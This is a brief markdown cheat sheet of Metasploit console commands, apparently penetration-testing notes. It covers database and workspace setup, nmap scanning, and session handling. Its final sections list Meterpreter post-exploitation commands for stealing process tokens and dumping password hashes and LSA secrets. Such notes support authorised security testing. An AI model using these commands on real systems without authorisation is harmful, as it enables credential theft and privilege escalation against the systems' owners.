# Databases

## Setup

```sh
sudo service postgresql status
sudo msfdb init

# Database connection status
msf6> db_status
# Export help
msf6> db_export -h
```

## Workspace

```sh
# List of workspace
msf6> workspace
# Workspace help
msf6> workspace -h
# Add workspace
msf6> workspace -a FooBar
# Switch to workspace
msf6> workspace FooBar
```

## NMAP

```sh
# Run nmap
msf6> db_nmap -sS -sV -sC 10.10.0.58
```

## Hosts

```sh
# List hosts
msf6> hosts
# Hosts help
msf6> hosts -h
```

## Services

```sh
# Service help
msf6> services -h
```

## Credentials

```sh
# Creds help
msf6> creds -h
# Add cred
msf6> creds add user:foobar password:notmypassword realm:thinc.local
```

## Sessions

```sh
# Sessions help
msf6> sessions -h
# Sessions list
msf6> sessions
# Interact with session
msf6> sessions -i 8
```

## Jobs

```sh
# Jobs help
msf6> jobs -h
# Jobs list
msf6> jobs
```

## Migration

```sh
# List processes
meterpreter > ps
# Steal token of process by it's ID
meterpreter > steal_token 1234
```

## Post exploit

```sh
# Exploit suggester
msf6> use multi/recon/local_exploit_suggester
# Dump hashes
meterpreter > hashdump
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets
```